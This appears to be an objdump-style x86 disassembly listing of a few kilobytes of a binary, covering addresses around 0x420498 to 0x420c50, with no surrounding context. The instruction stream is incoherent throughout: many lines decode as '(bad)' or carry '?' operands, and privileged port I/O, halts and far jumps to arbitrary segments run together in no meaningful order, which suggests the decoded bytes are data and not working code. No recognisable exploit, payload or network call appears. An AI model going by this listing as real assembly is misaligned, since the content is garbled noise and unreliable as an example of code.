  420498:	mov    ebx,0x22f02aaf
  42049d:	(bad)  
  42049e:	call   0x1ebc:0x3aa3cfd4
  4204a5:	xchg   esi,eax
  4204a6:	enter  0x981,0xdb
  4204aa:	mov    ch,0xf2
  4204ac:	and    al,dl
  4204ae:	ja     0x42048d
  4204b0:	jmp    0x9ae3:0xcb1dae15
  4204b7:	dec    ebx
  4204b8:	pop    esp
  4204b9:	outs   dx,BYTE PTR ds:[esi]
  4204ba:	mov    esp,DWORD PTR [esi+0x3ef3c9f3]
  4204c0:	fs in  al,dx
  4204c2:	sbb    eax,0x91fa954e
  4204c7:	bound  ecx,QWORD PTR [eax-0x3361b5e4]
  4204cd:	xlat   BYTE PTR ds:[ebx]
  4204ce:	int3   
  4204cf:	(bad)  
  4204d0:	pop    ss
  4204d1:	ins    BYTE PTR es:[edi],dx
  4204d2:	cmp    al,0x33
  4204d4:	and    eax,ebp
  4204d6:	push   0xffffffc2
  4204d8:	pushf  
  4204d9:	add    al,0x70
  4204db:	dec    edi
  4204dc:	aaa    
  4204dd:	xor    al,0x3a
  4204df:	xor    al,0xad
  4204e1:	jecxz  0x42052b
  4204e3:	jns    0x420515
  4204e5:	mov    dl,0xce
  4204e7:	nop
  4204e8:	hlt    
  4204e9:	sub    al,bh
  4204eb:	outs   dx,BYTE PTR ds:[esi]
  4204ec:	mov    al,0xe
  4204ee:	ja     0x42056a
  4204f0:	js     0x4204c6
  4204f2:	stc    
  4204f3:	bswap  eax
  4204f5:	std    
  4204f6:	aaa    
  4204f7:	xor    bl,BYTE PTR [esp+ebp*2]
  4204fa:	and    DWORD PTR [ecx-0x562f3623],edi
  420500:	or     eax,0x24406439
  420505:	imul   ebx,DWORD PTR [eax+0xf],0x222698d5
  42050c:	lods   al,BYTE PTR ds:[esi]
  42050d:	stos   DWORD PTR es:[edi],eax
  42050e:	push   eax
  42050f:	push   DWORD PTR ds:0xc48ce063
  420515:	test   al,0x61
  420517:	add    ebp,DWORD PTR [ebx+0x37]
  42051a:	pop    eax
  42051b:	mov    DWORD PTR [edi-0x4c],esp
  42051e:	cdq    
  42051f:	int    0xa9
  420521:	xor    al,0xa9
  420523:	push   0xf44dbf6f
  420528:	dec    esi
  420529:	jmp    0xa526:0x1fa2f24c
  420530:	add    BYTE PTR [ebx+ebx*2],bl
  420533:	daa    
  420534:	(bad)  
  420535:	jae    0x4204f9
  420537:	jnp    0x42050d
  420539:	mov    ebp,esp
  42053b:	inc    eax
  42053c:	adc    DWORD PTR [esp+esi*8-0x22],ebx
  420540:	fidivr WORD PTR [ebx-0x6dc21a98]
  420546:	outs   dx,BYTE PTR ds:[esi]
  420547:	shl    BYTE PTR [esi+0x11369261],cl
  42054d:	jne    0x42053d
  42054f:	fsub   DWORD PTR [edx-0x4f07e6fc]
  420555:	ja     0x420578
  420557:	sub    al,0xe4
  420559:	leave  
  42055a:	mov    DWORD PTR [esi],eax
  42055c:	xchg   ebx,eax
  42055d:	stos   BYTE PTR es:[edi],al
  42055e:	aas    
  42055f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420560:	mov    ebp,ecx
  420562:	mov    ch,0xd2
  420564:	mov    fs,WORD PTR [ebp+0x2f]
  420567:	pop    eax
  420568:	rcl    DWORD PTR [esi],0x9c
  42056b:	outs   dx,BYTE PTR ds:[esi]
  42056c:	and    al,0x36
  42056e:	jge    0x4205a0
  420570:	daa    
  420571:	in     al,0x78
  420573:	pusha  
  420574:	lahf   
  420575:	xor    dl,BYTE PTR [ecx-0x4229eb7]
  42057b:	sbb    DWORD PTR [ecx+0x3387444e],0xc8bf378d
  420585:	push   edx
  420586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420587:	sbb    edi,edx
  420589:	sbb    cl,ch
  42058b:	dec    esi
  42058c:	push   cs
  42058d:	jmp    0xd9c5fef5
  420592:	scas   eax,DWORD PTR es:[edi]
  420593:	cmc    
  420594:	cmp    ch,dl
  420596:	mov    eax,0xbc006880
  42059b:	mov    edi,ebx
  42059d:	pop    ds
  42059e:	shr    BYTE PTR [edx+0x1b],0x95
  4205a2:	jmp    0x458c:0xa9f3e3f2
  4205a9:	pushf  
  4205aa:	(bad)  
  4205ab:	mov    dl,0xf4
  4205ad:	mov    ds:0x8aead626,al
  4205b2:	inc    esp
  4205b3:	push   0xda08c8a3
  4205b8:	outs   dx,DWORD PTR ds:[esi]
  4205b9:	ret    0xb078
  4205bc:	xor    BYTE PTR [ebx+0x2b94be9],bl
  4205c2:	ins    BYTE PTR es:[edi],dx
  4205c3:	mov    edx,0x7f549b95
  4205c8:	xor    al,0xa2
  4205ca:	add    BYTE PTR [edx+0xd],0x67
  4205ce:	mov    bl,0xc2
  4205d0:	lods   al,BYTE PTR ds:[esi]
  4205d1:	in     al,dx
  4205d2:	aas    
  4205d3:	add    ch,BYTE PTR [edx+ebx*4-0x17fcf2b6]
  4205da:	pop    es
  4205db:	dec    ebp
  4205dc:	cdq    
  4205dd:	sub    dh,0x75
  4205e0:	mov    edi,0xea458de4
  4205e5:	retf   
  4205e6:	add    edx,DWORD PTR [ebx]
  4205e8:	sbb    edi,DWORD PTR [ecx+0x28]
  4205eb:	xor    eax,0x17f8da41
  4205f0:	fld    st(3)
  4205f2:	shl    BYTE PTR [eax+edx*8+0x2ecc8bac],0x74
  4205fa:	imul   esi,DWORD PTR [ecx+0x34],0x21
  4205fe:	push   es
  4205ff:	mov    ah,bh
  420601:	repz mov ebx,0xa4490194
  420607:	(bad)  
  420609:	jmp    0x9b6f0240
  42060e:	ds (bad) 
  420611:	or     BYTE PTR [ebx-0x33],ah
  420614:	fld    DWORD PTR [ebx+ebx*2-0x3c]
  420618:	rcl    BYTE PTR [edi+0x1db0207e],1
  42061e:	sbb    ch,BYTE PTR [edi-0x15]
  420621:	dec    ebx
  420622:	mov    al,0xc8
  420624:	into   
  420625:	sub    al,0x5e
  420627:	xor    bl,cl
  420629:	test   DWORD PTR [edx-0x2c2bc3c9],ebx
  42062f:	add    al,0xa6
  420631:	leave  
  420632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420633:	ins    DWORD PTR es:[edi],dx
  420634:	leave  
  420635:	cwde   
  420636:	cmc    
  420637:	pop    ebp
  420638:	pop    esp
  420639:	aas    
  42063a:	ins    DWORD PTR es:[edi],dx
  42063b:	push   ebx
  42063c:	cmp    al,0xff
  42063e:	sub    DWORD PTR [esi-0x536505cb],esi
  420644:	sub    al,0x8b
  420646:	ins    BYTE PTR es:[edi],dx
  420647:	retf   0xf789
  42064a:	or     al,0xaa
  42064c:	dec    esi
  42064d:	iret   
  42064e:	int3   
  42064f:	pop    edi
  420650:	cmp    ebx,ecx
  420652:	aad    0x4a
  420654:	fs gs jl 0x420603
  420658:	or     dh,BYTE PTR es:[esi]
  42065b:	fld    st(6)
  42065d:	jge    0x4206ca
  42065f:	add    BYTE PTR [eax+0x2],bh
  420662:	jmp    0xe5e:0xb2b9dd21
  420669:	inc    edx
  42066a:	push   cs
  42066b:	or     bl,BYTE PTR [esi+ecx*8]
  42066e:	mov    esp,0x1df7f459
  420673:	jmp    0xa0249b36
  420678:	jmp    0x4206da
  42067a:	lea    ebp,[edi-0x17]
  42067d:	pop    es
  42067e:	pop    es
  42067f:	nop
  420680:	fs ja  0x4206fe
  420683:	popf   
  420684:	dec    ecx
  420685:	hlt    
  420686:	jns    0x420680
  420688:	sub    esi,esi
  42068a:	mov    ebx,0xd162f3b8
  42068f:	jnp    0x420638
  420691:	inc    esi
  420692:	lods   eax,DWORD PTR ds:[esi]
  420693:	add    esp,DWORD PTR cs:[ebx-0x43]
  420697:	jg     0x42061b
  420699:	fisubr DWORD PTR [edi]
  42069b:	pop    ss
  42069c:	call   0xe749dc4d
  4206a1:	out    0x25,eax
  4206a3:	scas   eax,DWORD PTR es:[edi]
  4206a4:	into   
  4206a5:	icebp  
  4206a6:	sub    DWORD PTR [ecx],edx
  4206a8:	fnstsw WORD PTR [eax-0x29]
  4206ab:	sub    esp,eax
  4206ad:	push   ebp
  4206ae:	jo     0x42063d
  4206b0:	das    
  4206b1:	je     0x42070e
  4206b3:	je     0x4206b9
  4206b5:	enter  0xd9bb,0x3b
  4206b9:	xchg   edx,eax
  4206ba:	ss push ecx
  4206bc:	ins    DWORD PTR es:[edi],dx
  4206bd:	stos   DWORD PTR es:[edi],eax
  4206be:	das    
  4206bf:	js     0x4206e1
  4206c1:	mov    ds:0xcd507728,al
  4206c6:	retf   0x767b
  4206c9:	mov    al,0xee
  4206cb:	outs   dx,DWORD PTR ds:[esi]
  4206cc:	push   edx
  4206cd:	or     edi,edi
  4206cf:	push   ecx
  4206d0:	int    0xb5
  4206d2:	ret    
  4206d3:	jbe    0x4206d9
  4206d5:	mov    ds:0xf601d4a4,eax
  4206da:	cmp    al,0x26
  4206dc:	push   es
  4206dd:	mov    BYTE PTR [edx-0x1f9cbecf],0x3b
  4206e4:	jb     0x42074f
  4206e6:	test   eax,0xce854ae6
  4206eb:	aad    0xf0
  4206ed:	aam    0x11
  4206ef:	push   esp
  4206f0:	or     bl,BYTE PTR [edx]
  4206f2:	(bad)  
  4206f3:	aas    
  4206f4:	sbb    bl,ch
  4206f6:	pop    DWORD PTR [eax+0x75]
  4206f9:	lahf   
  4206fa:	pop    eax
  4206fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206fc:	sbb    eax,0x69f668be
  420701:	dec    eax
  420702:	in     eax,dx
  420703:	sahf   
  420704:	mov    edx,0x9d88c227
  420709:	outs   dx,BYTE PTR ds:[esi]
  42070a:	xchg   ebp,eax
  42070b:	inc    eax
  42070c:	enter  0x6998,0xfb
  420710:	jb     0x4206c8
  420712:	pop    ebx
  420713:	adc    eax,0x54c9dde0
  420718:	int    0x57
  42071a:	test   eax,0xf5ed79fe
  42071f:	adc    DWORD PTR [ecx-0x60],ebx
  420722:	sub    dl,ah
  420724:	lea    edx,[edx]
  420726:	dec    eax
  420727:	pop    ebp
  420728:	dec    ebp
  420729:	pop    es
  42072a:	clc    
  42072b:	inc    ecx
  42072c:	inc    edi
  42072d:	mov    edx,0x2db6677a
  420732:	int    0xc8
  420734:	pusha  
  420735:	mov    dh,0xb3
  420737:	and    al,0x5c
  42073a:	xor    DWORD PTR [ebp+0x5],edx
  42073d:	leave  
  42073e:	xchg   esi,eax
  42073f:	sub    al,0x77
  420741:	push   0x49396e9b
  420746:	mov    al,0xce
  420748:	mov    al,0x62
  42074a:	daa    
  42074b:	inc    edx
  42074c:	out    dx,al
  42074d:	bound  edx,QWORD PTR [ebx]
  42074f:	mov    dh,0xe7
  420751:	(bad)  
  420752:	jl     0x4206e9
  420754:	dec    ebx
  420755:	stc    
  420756:	dec    ebx
  420757:	sub    eax,0xa598e389
  42075c:	ins    DWORD PTR es:[edi],dx
  42075d:	dec    esi
  42075e:	xor    eax,0xbd956418
  420763:	aad    0x98
  420765:	(bad)  
  420766:	cmp    BYTE PTR [edx+0x3e],al
  420769:	popf   
  42076a:	enter  0xe9af,0x37
  42076e:	sbb    DWORD PTR [ecx+0x373d2e74],esp
  420774:	je     0x42077d
  420776:	shl    BYTE PTR [eax-0x3bffd213],cl
  42077c:	mov    BYTE PTR [ecx],0x33
  42077f:	xlat   BYTE PTR ds:[ebx]
  420780:	sub    bh,bh
  420782:	adc    esp,esp
  420784:	ret    
  420785:	mov    ecx,0xde2c32e5
  42078a:	call   0x143fa6f8
  42078f:	mov    al,ds:0xd36b730c
  420794:	mov    bh,0x56
  420796:	cmp    al,0x49
  420798:	aas    
  420799:	test   eax,0xc16a64e5
  42079e:	fadd   QWORD PTR [edi-0x23]
  4207a1:	mov    eax,ds:0x69f07809
  4207a6:	dec    esp
  4207a7:	lods   eax,DWORD PTR ds:[esi]
  4207a8:	or     BYTE PTR [edi],ah
  4207aa:	stos   DWORD PTR es:[edi],eax
  4207ab:	push   eax
  4207ac:	call   0x57377f2c
  4207b1:	ret    
  4207b2:	mul    BYTE PTR [edi-0x1dd29c09]
  4207b8:	dec    esi
  4207b9:	push   ebp
  4207ba:	xchg   esi,eax
  4207bb:	adc    ecx,DWORD PTR [edi]
  4207bd:	pop    ds
  4207be:	mov    al,ds:0x79ad440a
  4207c3:	ins    BYTE PTR es:[edi],dx
  4207c4:	in     al,0x3c
  4207c6:	int3   
  4207c7:	mov    ebp,0xa8cf597e
  4207cc:	jl     0x420828
  4207ce:	lock push edi
  4207d0:	adc    edi,DWORD PTR [ebp+edi*4-0x4f]
  4207d4:	push   ss
  4207d5:	xor    BYTE PTR [edi+0xb],bl
  4207d8:	in     al,0x22
  4207da:	add    BYTE PTR [edx+0x39e7a700],0xf7
  4207e1:	int    0xf4
  4207e3:	inc    esp
  4207e4:	ret    
  4207e5:	hlt    
  4207e6:	push   es
  4207e7:	sar    BYTE PTR [ecx+0x2],0x2
  4207eb:	retf   
  4207ec:	lds    esp,FWORD PTR [esi+0x7d435d3]
  4207f2:	adc    eax,0x1283acfb
  4207f7:	and    al,0x7f
  4207f9:	mov    ah,0x40
  4207fb:	pop    ds
  4207fc:	or     dl,BYTE PTR [edx+0x37628911]
  420802:	jmp    0x4852e51d
  420807:	ret    
  420808:	das    
  420809:	pop    esp
  42080a:	sbb    eax,0x7694705e
  42080f:	mov    edi,0x23f97404
  420814:	jl     0x420860
  420816:	and    DWORD PTR [ebx+0x28107d4b],esp
  42081c:	dec    edi
  42081d:	stos   BYTE PTR es:[edi],al
  42081e:	out    dx,eax
  42081f:	sbb    dl,BYTE PTR gs:0x6fafd0fc
  420826:	pop    es
  420827:	sbb    DWORD PTR es:[ecx-0x47],0x4d1cd6e8
  42082f:	pop    edx
  420830:	cmp    bl,ah
  420832:	adc    ecx,DWORD PTR [edx+eiz*2-0xb3b40e2]
  420839:	mov    cl,bh
  42083b:	xor    esi,DWORD PTR [esi+0x44c0e628]
  420841:	xor    bh,BYTE PTR [ecx+0x79]
  420844:	add    BYTE PTR [edi],cl
  420846:	stos   DWORD PTR es:[edi],eax
  420847:	dec    edi
  420848:	lea    esi,[esi]
  42084a:	addr16 pop ss
  42084c:	mov    eax,0xce319b63
  420851:	enter  0x69ee,0x2c
  420855:	outs   dx,BYTE PTR ds:[si]
  420857:	fsub   QWORD PTR [esi-0x78]
  42085a:	xchg   ebp,eax
  42085b:	and    dl,BYTE PTR [esi-0x9d03c0a]
  420861:	xor    al,0x89
  420863:	adc    al,0x14
  420865:	mov    ds:0x98073ece,eax
  42086a:	push   eax
  42086b:	sti    
  42086c:	mul    BYTE PTR [ebx-0x45]
  42086f:	jno    0x4208d9
  420871:	lds    ebx,FWORD PTR [eax]
  420873:	cmp    BYTE PTR [ebp+0x7440e8e3],ah
  420879:	fsubrp st(0),st
  42087b:	or     ebp,DWORD PTR [ecx]
  42087d:	jno    0x42088e
  42087f:	mov    bh,0x6
  420881:	pop    es
  420882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420883:	push   eax
  420884:	xlat   BYTE PTR ds:[ebx]
  420885:	rcl    BYTE PTR [esp+ebp*2+0x240ed878],cl
  42088c:	arpl   WORD PTR [edx-0x4a167414],si
  420892:	das    
  420893:	scas   al,BYTE PTR es:[edi]
  420894:	dec    edx
  420895:	push   es
  420896:	ins    BYTE PTR es:[edi],dx
  420897:	xlat   BYTE PTR ds:[ebx]
  420898:	mov    al,0xe
  42089a:	or     BYTE PTR [ebx+edi*2-0x33],ah
  42089e:	jl     0x42089d
  4208a0:	bound  esp,QWORD PTR ds:0xb2d99fe3
  4208a6:	xchg   edi,eax
  4208a7:	mov    al,ds:0xa0b99c1
  4208ac:	and    eax,0x7a9bb4fb
  4208b1:	sub    eax,0x381b1697
  4208b6:	mov    ah,0x5
  4208b8:	jge    0x420927
  4208ba:	leave  
  4208bb:	sbb    esp,DWORD PTR [esi+0x644d1605]
  4208c1:	pusha  
  4208c2:	inc    ecx
  4208c3:	fstp   TBYTE PTR [edi-0xe]
  4208c6:	or     dh,BYTE PTR cs:[esi]
  4208c9:	sub    al,0x70
  4208cb:	test   DWORD PTR [ebp+0xcf881fe],0xd02efca
  4208d5:	pop    esp
  4208d6:	pop    es
  4208d7:	pop    ecx
  4208d8:	pusha  
  4208d9:	mov    ecx,0x77e5c49e
  4208de:	hlt    
  4208df:	(bad)  
  4208e0:	xchg   BYTE PTR [ecx+0x63],dl
  4208e3:	adc    BYTE PTR [ebx+0x65],ch
  4208e6:	inc    edx
  4208e7:	mov    WORD PTR [edi],fs
  4208e9:	push   esp
  4208ea:	popa   
  4208eb:	adc    dl,BYTE PTR [edx+0x17ab8cd9]
  4208f1:	inc    esp
  4208f2:	(bad)  [ebp+ecx*2-0x12c8b054]
  4208f9:	mov    ah,BYTE PTR [ebp+0x63]
  4208fc:	cmp    BYTE PTR [edi+0x4],bh
  4208ff:	aad    0x16
  420901:	icebp  
  420902:	repz test DWORD PTR [esi],edi
  420905:	neg    DWORD PTR [edx-0x7aed8453]
  42090b:	inc    edx
  42090c:	retf   
  42090d:	sbb    DWORD PTR [ecx-0x60445181],ecx
  420913:	xor    DWORD PTR [edi-0x15d7b780],esp
  420919:	lahf   
  42091a:	hlt    
  42091b:	out    dx,al
  42091c:	cmp    al,0xf7
  42091e:	jbe    0x420934
  420920:	and    BYTE PTR [edx+eiz*4-0x276d3ba8],cl
  420927:	sbb    eax,DWORD PTR [edx-0x2d79bcd0]
  42092d:	xor    ecx,DWORD PTR [ebx-0x2c46ea15]
  420933:	push   esi
  420934:	cdq    
  420935:	mov    WORD PTR [esi+0x6b33313e],?
  42093b:	stc    
  42093c:	aam    0xdc
  42093e:	mov    al,ds:0x58340df9
  420943:	and    al,0xd
  420945:	push   es
  420946:	outs   dx,DWORD PTR ds:[esi]
  420947:	xor    bh,dh
  420949:	data16 or al,0xc
  42094c:	shl    BYTE PTR [edx+ebx*4],1
  42094f:	lock push cs
  420951:	out    0x98,al
  420953:	pop    ebp
  420954:	push   ds
  420955:	mov    DWORD PTR [edi],edx
  420957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420958:	inc    esp
  420959:	jp     0x42099f
  42095b:	push   edi
  42095c:	mov    eax,ds:0x226bc348
  420961:	lahf   
  420962:	push   eax
  420963:	into   
  420964:	rcl    DWORD PTR [edx-0x3facb5d],0x32
  42096b:	gs adc ebx,esi
  42096e:	(bad)  
  42096f:	xchg   edi,eax
  420970:	int    0x62
  420972:	add    al,0x51
  420974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420975:	gs xor eax,0x351c0c12
  42097b:	fist   WORD PTR [edi-0x4772e47c]
  420981:	fnsave [edx+0x3b]
  420984:	xchg   ebp,eax
  420985:	sub    BYTE PTR [edx+0x4d5bcc14],dl
  42098b:	mov    sp,0x9813
  42098f:	(bad)  
  420990:	outs   dx,BYTE PTR ds:[esi]
  420991:	xchg   BYTE PTR [ebp+0x3943d6b7],ch
  420997:	pop    esi
  420998:	loopne 0x420947
  42099a:	fsubr  st(1),st
  42099c:	call   0xe258:0x30243f9c
  4209a3:	fadd   st,st(4)
  4209a5:	cmp    eax,0x6fb912a2
  4209aa:	imul   ebx,DWORD PTR [edx+0x14],0x11410392
  4209b1:	xor    ebp,DWORD PTR [esi]
  4209b3:	xchg   esp,eax
  4209b4:	(bad)  
  4209b5:	into   
  4209b6:	dec    edx
  4209b7:	mov    ebx,0x5ee7ebb9
  4209bc:	mov    ch,0x30
  4209be:	and    eax,0x4b4dbb35
  4209c3:	out    0x6f,al
  4209c5:	mov    bx,0xebfe
  4209c9:	mov    al,0xb
  4209cb:	and    BYTE PTR [edx],ah
  4209cd:	stc    
  4209ce:	bound  ecx,QWORD PTR fs:[edx]
  4209d1:	xor    dh,BYTE PTR [esp+0x28]
  4209d5:	xchg   ecx,eax
  4209d6:	test   BYTE PTR [eax+0x7d],al
  4209d9:	pop    ecx
  4209da:	sub    BYTE PTR [edx],al
  4209dc:	loopne 0x420a54
  4209de:	inc    ebx
  4209df:	jne    0x420a25
  4209e1:	xchg   esi,eax
  4209e2:	adc    dl,ch
  4209e4:	cli    
  4209e5:	loop   0x4209aa
  4209e7:	shl    BYTE PTR [esp+ebp*1],1
  4209ea:	pushf  
  4209eb:	int3   
  4209ec:	hlt    
  4209ed:	popa   
  4209ee:	lahf   
  4209ef:	jne    0x4209d6
  4209f1:	push   esp
  4209f2:	jmp    DWORD PTR [esi]
  4209f4:	lea    ebx,[eax]
  4209f6:	pop    edi
  4209f7:	test   al,0x86
  4209f9:	xor    al,bl
  4209fb:	repnz mov dh,0xb
  4209fe:	test   eax,0x50db30be
  420a03:	pushf  
  420a04:	and    DWORD PTR [edi],esp
  420a06:	retf   
  420a07:	icebp  
  420a08:	sbb    BYTE PTR [edx+eax*1-0x70aea07f],al
  420a0f:	aam    0x78
  420a11:	je     0x420a40
  420a13:	mov    WORD PTR [ebp-0x6a],ss
  420a16:	ss and eax,0x5e00128f
  420a1c:	stos   BYTE PTR es:[edi],al
  420a1d:	jnp    0x420a52
  420a1f:	pop    esi
  420a20:	iret   
  420a21:	cmp    dl,BYTE PTR [ecx+0x7f]
  420a24:	inc    ebx
  420a25:	jle    0x420a72
  420a27:	maxps  xmm5,XMMWORD PTR [edx+0x25]
  420a2b:	imul   ebx,DWORD PTR [eax-0x1a997357],0x3763dba5
  420a35:	xor    al,0xd4
  420a37:	fstp   QWORD PTR [ecx+0x3b45954f]
  420a3d:	add    ebx,eax
  420a3f:	in     eax,dx
  420a40:	jne    0x420aac
  420a42:	and    al,0xda
  420a44:	jne    0x420a08
  420a46:	enter  0x1cc9,0x9d
  420a4a:	nop
  420a4b:	test   DWORD PTR [esp+edi*8+0x4abf43e3],edi
  420a52:	jle    0x420a7d
  420a54:	xchg   DWORD PTR [esi],edi
  420a56:	sub    esp,DWORD PTR [edx+0x43]
  420a59:	leave  
  420a5a:	loopne 0x4209fc
  420a5c:	push   ebx
  420a5d:	(bad)  
  420a5e:	loop   0x420a9b
  420a60:	popf   
  420a61:	mov    al,ds:0xbe4dd990
  420a66:	icebp  
  420a67:	jb     0x420ae4
  420a69:	mov    ds:0x48be4e24,eax
  420a6e:	mov    dh,0xe2
  420a70:	lods   eax,DWORD PTR ds:[esi]
  420a71:	jmp    0x580e638a
  420a76:	adc    bl,BYTE PTR [eax+0xa40fa4c]
  420a7c:	and    al,0x5b
  420a7e:	xchg   ebp,eax
  420a7f:	pop    eax
  420a80:	(bad)  
  420a81:	into   
  420a82:	ret    
  420a83:	inc    eax
  420a84:	add    dl,BYTE PTR [ecx+0x489004b1]
  420a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a8c:	fdivr  st,st(5)
  420a8e:	push   0xffffffe1
  420a90:	mov    eax,ds:0xbaa316bb
  420a95:	adc    eax,0x4dfa6360
  420a9a:	inc    DWORD PTR [ebx-0x51]
  420a9d:	es dec eax
  420a9f:	mov    ah,0x6b
  420aa1:	rol    bh,cl
  420aa3:	je     0x420aa7
  420aa5:	addr16 adc al,0x5b
  420aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420aa9:	test   bl,dl
  420aab:	inc    ecx
  420aac:	dec    edi
  420aad:	mov    eax,DWORD PTR [ecx]
  420aaf:	mov    eax,ds:0x45bf1667
  420ab4:	sub    al,0x23
  420ab6:	shl    BYTE PTR [esi+0x5c],1
  420ab9:	xchg   esi,eax
  420aba:	mov    ds:0xd82d4836,eax
  420abf:	(bad)  
  420ac0:	and    esp,esp
  420ac2:	out    dx,al
  420ac3:	fistp  QWORD PTR [ebx+ecx*1+0x7d39a203]
  420aca:	nop
  420acb:	cs pushf 
  420acd:	loop   0x420b08
  420acf:	in     eax,0xcc
  420ad1:	inc    edx
  420ad2:	fcom   DWORD PTR [esi+0x3d]
  420ad5:	enter  0xcd2c,0x72
  420ad9:	(bad)  
  420ada:	icebp  
  420adb:	sub    eax,0x2e8688a4
  420ae0:	mov    ah,0xca
  420ae2:	out    0xe1,eax
  420ae4:	out    dx,al
  420ae5:	adc    DWORD PTR [esi],ebp
  420ae7:	push   esi
  420ae8:	ffree  st(7)
  420aea:	stos   BYTE PTR es:[edi],al
  420aeb:	cbw    
  420aed:	popa   
  420aee:	ins    DWORD PTR es:[edi],dx
  420aef:	jmp    0xa9b7878e
  420af4:	fcom   DWORD PTR [esi+esi*4]
  420af8:	ret    
  420af9:	push   edi
  420afa:	ins    DWORD PTR es:[edi],dx
  420afb:	in     al,dx
  420afc:	adc    edi,DWORD PTR [ebp-0x47]
  420aff:	dec    edx
  420b00:	pop    ds
  420b01:	pop    ds
  420b02:	(bad)  
  420b03:	adc    eax,0x98852f4c
  420b08:	jns    0x420b6d
  420b0a:	push   0x48
  420b0c:	retf   
  420b0d:	out    0x62,al
  420b0f:	xor    ebx,esp
  420b11:	mov    cl,0x3e
  420b13:	and    BYTE PTR [edi],dh
  420b15:	add    BYTE PTR [edi-0x2b2c8511],ah
  420b1b:	cmp    DWORD PTR [ecx+0x60e2bac8],ebx
  420b21:	rol    BYTE PTR [edx-0xd1aff45],0x30
  420b28:	lea    edx,[eax-0x28]
  420b2b:	cdq    
  420b2c:	clc    
  420b2d:	xlat   BYTE PTR ds:[ebx]
  420b2e:	xor    BYTE PTR [edi-0x710fa448],cl
  420b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b35:	jge    0x420b22
  420b37:	adc    BYTE PTR ds:0x97fc0457,dh
  420b3d:	sbb    al,0xb0
  420b3f:	ret    
  420b40:	mov    ch,0xc6
  420b42:	mov    es,ebp
  420b44:	neg    DWORD PTR [ecx-0x762be935]
  420b4a:	loop   0x420b7e
  420b4c:	aam    0x74
  420b4e:	dec    edx
  420b4f:	(bad)  
  420b50:	xor    eax,DWORD PTR [esi]
  420b52:	mov    ch,BYTE PTR [ecx+esi*8+0x63]
  420b56:	imul   ecx,DWORD PTR [ecx],0xf6ca0a82
  420b5c:	ja     0x420ba6
  420b5e:	mov    ?,WORD PTR [ebx]
  420b60:	xor    eax,0xd9041a75
  420b65:	cmp    ecx,DWORD PTR [esi+0x6332dc2]
  420b6b:	(bad)  
  420b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b6d:	fs xor al,0x88
  420b70:	add    bl,bh
  420b72:	cli    
  420b73:	js     0x420b3b
  420b75:	stos   DWORD PTR es:[edi],eax
  420b76:	adc    DWORD PTR [edi-0x3a4cf918],ebx
  420b7c:	data16 adc bh,BYTE PTR [edi+0x7427c4d5]
  420b83:	call   0xaed4:0x4804a624
  420b8a:	mov    BYTE PTR [ecx-0x2a],dh
  420b8d:	sar    DWORD PTR [esp+ebx*2-0x70ec1c2e],0x26
  420b95:	pop    ss
  420b96:	rcl    BYTE PTR [ecx],1
  420b98:	and    ebp,DWORD PTR [ebp+0x2facc583]
  420b9e:	scas   al,BYTE PTR es:[edi]
  420b9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ba0:	jmp    ebp
  420ba2:	cmp    eax,DWORD PTR [ecx-0x5cdf8dfc]
  420ba8:	cdq    
  420ba9:	jae    0x420b85
  420bab:	pop    esi
  420bac:	or     BYTE PTR [ebx+edi*2+0x74e257f1],bh
  420bb3:	and    ebp,DWORD PTR [edx]
  420bb5:	ins    DWORD PTR es:[edi],dx
  420bb6:	gs pop edi
  420bb8:	and    BYTE PTR [ebp+0x3f],ch
  420bbb:	inc    esi
  420bbc:	imul   BYTE PTR [eax]
  420bbe:	xor    eax,0x61fa000
  420bc3:	dec    edx
  420bc4:	(bad)  
  420bc5:	push   edi
  420bc6:	add    DWORD PTR [ebx],edi
  420bc8:	mov    ?,eax
  420bca:	clc    
  420bcb:	and    ebp,DWORD PTR [eax+0x800dbd1]
  420bd1:	cmp    eax,0x29e49e24
  420bd6:	push   esi
  420bd7:	stc    
  420bd8:	ds pop esp
  420bda:	rcr    BYTE PTR ds:0x4854ff66,0x5d
  420be1:	in     eax,0x22
  420be3:	sub    BYTE PTR [eax],bh
  420be5:	mov    DWORD PTR [ecx],edx
  420be7:	test   al,0x1
  420be9:	xor    DWORD PTR [ecx-0x50c832d8],0xe423d16f
  420bf3:	sub    eax,0xa0a00784
  420bf8:	adc    cl,BYTE PTR [ebx-0x356e91c7]
  420bfe:	xchg   ebp,eax
  420bff:	pop    ecx
  420c00:	pop    ss
  420c01:	xor    eax,0x7d574e96
  420c06:	stos   DWORD PTR es:[edi],eax
  420c07:	pushf  
  420c08:	jp     0x420bf6
  420c0a:	(bad)  
  420c0b:	dec    esp
  420c0c:	xor    eax,0x3ec3cf3b
  420c11:	push   esi
  420c12:	repnz div DWORD PTR [eax]
  420c15:	(bad)  
  420c16:	jmp    0x420bc4
  420c18:	test   ch,cl
  420c1a:	fidiv  WORD PTR [edi-0x62108593]
  420c20:	pop    ebp
  420c21:	pusha  
  420c22:	bound  ecx,QWORD PTR ds:0x9fe47c17
  420c28:	dec    esp
  420c29:	mov    ah,0x9
  420c2b:	sti    
  420c2c:	aad    0x40
  420c2e:	arpl   bx,sp
  420c30:	mov    ebp,0xec2680e8
  420c35:	lahf   
  420c36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c37:	lods   al,BYTE PTR ds:[esi]
  420c38:	call   0x36c7c526
  420c3d:	ficomp DWORD PTR [esi-0x9]
  420c40:	shl    ebp,1
  420c42:	icebp  
  420c43:	ficomp WORD PTR [ecx]
  420c45:	sbb    esp,DWORD PTR [edi+edi*2+0x27]
  420c49:	push   eax
  420c4a:	inc    eax
  420c4b:	pusha  
  420c4c:	jbe    0x420c52
  420c4e:	adc    al,0x7e
  420c50:	sbb    ecx,esi
